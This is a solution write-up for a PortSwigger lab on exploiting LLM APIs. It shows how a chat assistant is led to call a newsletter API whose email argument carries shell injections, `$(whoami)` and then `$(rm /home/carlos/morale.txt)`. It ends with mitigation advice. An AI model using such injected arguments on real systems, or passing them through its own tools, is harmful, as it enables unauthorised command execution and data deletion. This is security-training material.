- cwe: CWE-77

## Scenario

Teach me the official solution for this PortSwigger Academy lab.

Lab: Exploiting vulnerabilities in LLM APIs
Topic: Web LLM attacks
Level: Practitioner

Scenario:
This lab contains an OS command injection vulnerability that can be exploited via its APIs. You can call these APIs via the LLM. To solve the lab, delete the `morale.txt` file from Carlos' home directory.

Required knowledge

 To solve this lab, you'll need to know:

How to map LLM API attack surface. For more information, see our Web LLM attacks Academy topic.
How to exploit OS command injection vulnerabilities. For more information, see our OS command injection topic.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers Web LLM attacks: "Exploiting vulnerabilities in LLM APIs".

## Solution steps

1. From the lab homepage, click Live chat.
2. Ask the LLM what APIs it has access to. The LLM responds that it can access APIs controlling the following functions: Password Reset Newsletter Subscription Product Information
3. Consider the following points: You will probably need remote code execution to delete Carlos' `morale.txt` file. APIs that send emails sometimes use operating system commands that offer a pathway to RCE. You don't have an account so testing the password reset will be tricky. The Newsletter Subscription API is a better initial testing target.
4. Ask the LLM what arguments the Newsletter Subscription API takes.
5. Ask the LLM to call the Newsletter Subscription API with the argument `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
6. Click Email client and observe that a subscription confirmation has been sent to the email address as requested. This proves that you can use the LLM to interact with the Newsletter Subscription API directly.
7. Ask the LLM to call the Newsletter Subscription API with the argument `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
8. Click Email client and observe that the resulting email was sent to `carlos@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`. This suggests that the `whoami` command was executed successfully, indicating that remote code execution is possible.
9. Ask the LLM to call the Newsletter Subscription API with the argument `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`. The resulting API call causes the system to delete Carlos'` morale.txt` file, solving the lab.

## Vulnerability note

Underlying issue: Web LLM attacks (CWE-77). Isolate LLM tools from sensitive actions, sanitize model outputs before acting on them, and constrain tool permissions.
